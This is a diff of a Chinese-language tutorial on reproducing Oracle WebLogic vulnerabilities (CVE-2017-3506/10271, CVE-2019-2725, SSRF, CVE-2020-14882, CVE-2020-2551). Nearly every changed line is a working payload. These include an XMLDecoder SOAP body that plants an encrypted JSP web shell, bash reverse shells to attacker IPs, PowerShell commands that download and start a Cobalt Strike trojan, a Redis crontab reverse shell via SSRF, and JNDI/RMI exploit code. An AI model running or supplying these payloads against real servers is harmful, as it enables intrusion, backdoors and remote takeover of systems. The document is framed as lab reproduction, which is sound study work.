@@ -19,11 +19,11 @@ WebLogic Server 具有标准和可扩展性的优点，对业内多种标准都�
 目前较为活跃的版本：
 
 ```
-Weblogic 10.3.6.0
-Weblogic 12.1.3.0
-Weblogic 12.2.1.1
-Weblogic 12.2.1.2
-Weblogic 12.2.1.3
+Weblogic 10.3.6.0
+Weblogic 12.1.3.0
+Weblogic 12.2.1.1
+Weblogic 12.2.1.2
+Weblogic 12.2.1.3
 ```
 
 ### 二. weblogic 安装
@@ -104,7 +104,7 @@ image-20210809135607222![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQR
 这里一定要以管理员身份运行，不然提取文件会失败
 
 ```
-java -jar fmw_12.1.3.0.0_wls.jar
+java -jar fmw_12.1.3.0.0_wls.jar
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDfaGDxqmwA4k7ib3XibhBX6MQHR006S0OOzSDpMhKN222tVzkKJ2PEPXw/640?wx_fmt=png)image-20210814163432029![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNyT5gGcibFibzRTnwk6W2WOHiaJibY9DKk2M5kudYdBOnDwz59Rsau4ldA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDSjXxpxiaPaM5eUNbnpWZs89TYSzIBktpfqC2ulAkSmmG0CRAwTFEfOQ/640?wx_fmt=png)image-20210814165250515![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDcJ4vHKQdYtW4ut2IUauJAgjxXI8TLkDz9jSzOg7zeTW5g9xSI0A5iaA/640?wx_fmt=png)image-20210814165616715
@@ -191,7 +191,7 @@ C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_
 抓包，修改内容
 
 ```
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java><java version="1.4.0" class="java.beans.XMLDecoder"> <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string> <void method="println"><string> <![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ]]> </string> </void> <void method="close"/> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java><java version="1.4.0" class="java.beans.XMLDecoder"> <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string> <void method="println"><string> <![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ]]> </string> </void> <void method="close"/> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDwI4AxXic9D8cMwpxYcvBOs7D2CtH6jdhvkibT2CYurInRhn3Iic5XZdhw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDpyKFGNodbAqNNJ8RTA8bSnyic0W3sk6lJgQqfbaaDNQvQFmbHlFiar6Q/640?wx_fmt=png)image-20210809162737924![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDdOZbFsjNjMBVKphxucSuXbia1wnXWpy8JaaUG49ByVQeZ1esIm7U6oQ/640?wx_fmt=png)image-20210809162717485
@@ -199,13 +199,13 @@ C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_
 实现 Linux 反弹 shell 的 poc：
 
 ```
-POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: x.x.x.x:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/x.x.x.x/4444 0>&1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
+POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: x.x.x.x:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/x.x.x.x/4444 0>&1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
 ```
 
 实现 win 上线 cs
 
 ```
-POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.10.154:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 704<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string> </void> <void index="1"> <string>-Command</string> </void> <void index="2"> <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
+POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.10.154:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 704<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string> </void> <void index="1"> <string>-Command</string> </void> <void index="2"> <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
 ```
 
 cs 生成后门木马
@@ -219,7 +219,7 @@ cs 生成后门木马
 powershell 上线 cs：
 
 ```
-powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
+powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXgmEY6ibwtF9vADpRvrbV2vicMP7JpMjibPhNzyIyD06kYlBbdXiahrdOQ/640?wx_fmt=png)image-20210810111100065![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDbl4jEEpXDiakDrjVOPah0GgAz0JmJut3ia1mU9WFbIiaeTtvtA7I5ARjg/640?wx_fmt=png)image-20210810110916447
@@ -239,7 +239,7 @@ http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
 cve-2017-10271 与 3506 他们的漏洞原理是一样的, 只不过 10271 绕过了 3506 的补丁，CVE-2017-3506 的补丁加了验证函数，验证 Payload 中的节点是否存在 object Tag。
 
 ```
-private void validate(InputStream is){ WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser =factory.newSAXParser(); parser.parse(is, newDefaultHandler() { public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException { if(qName.equalsIgnoreCase("object")) { throw new IllegalStateException("Invalid context type: object"); } } }); } catch(ParserConfigurationException var5) { throw new IllegalStateException("Parser Exception", var5); } catch (SAXExceptionvar6) { throw new IllegalStateException("Parser Exception", var6); } catch (IOExceptionvar7) { throw new IllegalStateException("Parser Exception", var7); } }
+private void validate(InputStream is){ WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser =factory.newSAXParser(); parser.parse(is, newDefaultHandler() { public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException { if(qName.equalsIgnoreCase("object")) { throw new IllegalStateException("Invalid context type: object"); } } }); } catch(ParserConfigurationException var5) { throw new IllegalStateException("Parser Exception", var5); } catch (SAXExceptionvar6) { throw new IllegalStateException("Parser Exception", var6); } catch (IOExceptionvar7) { throw new IllegalStateException("Parser Exception", var7); } }
 ```
 
 ##### 影响版本
@@ -248,7 +248,7 @@ private void validate(InputStream is){ WebLogicSAXParserFactory factory =�
 10.3.6.0
 12.1.3.0
 12.2.1.0
-12.2.1.1 
+12.2.1.1 
 12.2.1.2
 ```
 
@@ -257,7 +257,7 @@ private void validate(InputStream is){ WebLogicSAXParserFactory factory =�
 利用的 poc:
 
 ```
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java> <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string> <void method="println"> <string> <![CDATA[ <% out.print("zcc1 hello"); %> ]]> </string> </void> <void method="close"/> </object> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java> <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string> <void method="println"> <string> <![CDATA[ <% out.print("zcc1 hello"); %> ]]> </string> </void> <void method="close"/> </object> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDTdicqp7EiaHkAVvwn461v7jHHptSqRicD4hD18xhJQEDW62OAfwKqmXDw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDO75dmGx0ZaKkHE0McKiabZQe27AibWA6axdCT3pLohjSeTz88icn95WqQ/640?wx_fmt=png)image-20210810141515224
@@ -290,7 +290,7 @@ wsat.war
 
 ##### 验证漏洞
 
-访问  /_async/AsyncResponseService，返回 200 则存在，404 则不存在
+访问  /_async/AsyncResponseService，返回 200 则存在，404 则不存在
 
 查看 web.xml 得知受影响的 url 如下：
 
@@ -320,7 +320,7 @@ C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_
 win 上线 cs 的 poc 如下，这里 exe 用的是上面生成的：
 
 ```
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string></void><void index="1"><string>-Command</string></void><void index="2"><string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string></void><void index="1"><string>-Command</string></void><void index="2"><string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDbfibFLS0SXoklrQa8pYRMGy2Pvot1iaqoQbfk37Yph6ciaUsxhSPVrDyA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDp4vibpGakL4128UGr1W87TamzVvgwg1yj0uSqN3XVANZ2MiaBuCM4CcQ/640?wx_fmt=png)
@@ -384,7 +384,7 @@ windows-getshell，使用 k8weblogicGUI.exe
 在此处上线 cs，用的依旧是上面的马，改名 zcc3.exe
 
 ```
-powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
+powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDgN5S8MIQUqXk0K7k7h0foHH5MD2zZC4kOyeibrRFztLDoiaJJr5cwdfg/640?wx_fmt=png)image-20210810170001387![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDUSbKKQ5mic1wWqURvgw7yOWjhYNrIh2yevNiaT1zOqia3gEiaibHBmDlgpA/640?wx_fmt=png)image-20210810170039655
@@ -499,7 +499,7 @@ http://192.168.0.105:7001/ws_utc/css/upload/RS_Upload_2021-08-14_17-59-33_143/im
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDxTjRT2NXXKibUySUqE6sfCubr5TRo8AsiaoWeXAib3J24f9sEIxqs6Mvg/640?wx_fmt=png)
 
 ```
-powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
+powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXlYnIkq7HP7VTJlIadZ0CD3ibRnt2Cfc0e6T5s51OT6iaPYhAHiaIEHIw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD6Whpvssyr20o2ibVe8gdDialYqeyFQOT3U6peb9KYRQ6gytCvmvsq6VQ/640?wx_fmt=png)image-20210814181718937
@@ -546,7 +546,7 @@ Oracle WebLogic Web Server 既可以被外部主机访问，同时也允许访�
 发现返回如下信息，说明开放 7001 端口，但是不是 http 协议
 
 ```
-An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.
+An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.
 ```
 
 image-20210814192706701
@@ -554,7 +554,7 @@ image-20210814192706701
 访问未开放的端口，会返回下面的信息
 
 ```
-An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7002'
+An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7002'
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBorkfevUyLJdFkT5WZWX6kxibjPEJ7u2jOPD8kp77pjzj38O2UtuwtA/640?wx_fmt=png)image-20210814193417626
@@ -562,7 +562,7 @@ An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapEx
 访问存在的端口，且为 http 协议时返回如下
 
 ```
-An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
+An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDWC4QibulvziajA23DhUYkVWvu5O12K7sK0gDVnwXWoO859ZDEF8oEDMg/640?wx_fmt=png)image-20210814203203147
@@ -578,7 +578,7 @@ An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapEx
 这里查一下开启 redis 服务的这个容器 IP，找到 ip：172.20.0.2
 
 ```
-docker inspect a5a
+docker inspect a5a
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDQOlnFbS3Y60ElArQZjDz4xeAs2ooiatGyY0pPy0eKYcy7WD6uSQqsSQ/640?wx_fmt=png)image-20210814204200558
@@ -594,7 +594,7 @@ docker inspect a5a
 burp 改包直接将弹 shell 脚本到本机 kail 上（192.168.0.104）
 
 ```
-set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"config set dir /etc/config set dbfilename crontabsave
+set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"config set dir /etc/config set dbfilename crontabsave
 ```
 
 经过 url 编码后，写入 bp 中 operator 参数的后面:
@@ -686,7 +686,7 @@ http://192.168.0.105:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=tru
 CVE-2020-14882: 代码执行漏洞的 poc：
 
 ```
-http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
+http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
 ```
 
 这里复现用的 vulhub 靶场
@@ -700,7 +700,7 @@ http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=tru
 这里执行反弹 shell 的 xml 文件 poc.xml：
 
 ```
-## poc.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">    <constructor-arg>      <list>        <value>/bin/bash</value>        <value>-c</value>        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>      </list>    </constructor-arg>  </bean></beans>
+## poc.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">    <constructor-arg>      <list>        <value>/bin/bash</value>        <value>-c</value>        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>      </list>    </constructor-arg>  </bean></beans>
 ```
 
 把 poc.xml 放在打开 http 服务的 kali 机子上 (ip:192.168.0.108)：
@@ -745,7 +745,7 @@ http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=tru
 需要安装 java8 环境
 
 ```
-cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
+cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
 ```
 
 这里我已经安装好
@@ -755,7 +755,7 @@ cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz
 exp.java 代码
 
 ```
-import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
+import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
 ```
 
 image-20210814230308993
@@ -763,7 +763,7 @@ image-20210814230308993
 java 编译 exp.java
 
 ```
-javac exp.java -source 1.6 -target 1.6
+javac exp.java -source 1.6 -target 1.6
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDhXicNS9zVib9S0M0GndHSOp2my1Y29sUxm1GTiaHUfpFJ82VNERQdmbxw/640?wx_fmt=png)image-20210814230430269
@@ -775,7 +775,7 @@ javac exp.java -source 1.6 -target 1.6
 使用 marshalsec 启动一个 rmi 服务
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDsQibMOoa34rg2Rw0YJ7pbkZAgd366W3e0Lv3ddCzY0uYY0wpX8Sicib8g/640?wx_fmt=png)image-20210814230935474
@@ -783,7 +783,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "htt
 使用工具 weblogic_CVE_2020_2551.jar，执行 exp
 
 ```
-java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
+java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBO6lialIXibTViaW9BSSoEyPSnUc23VOQov37iavbrcRCicdY27Mpz213Dg/640?wx_fmt=png)image-20210814231847184
@@ -795,7 +795,7 @@ java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108
 同理，上线 cs 的话，只需改 exp.java 代码即可，后续步骤一样
 
 ```
-import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
+import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
 ```
 
 ##### 安全防护
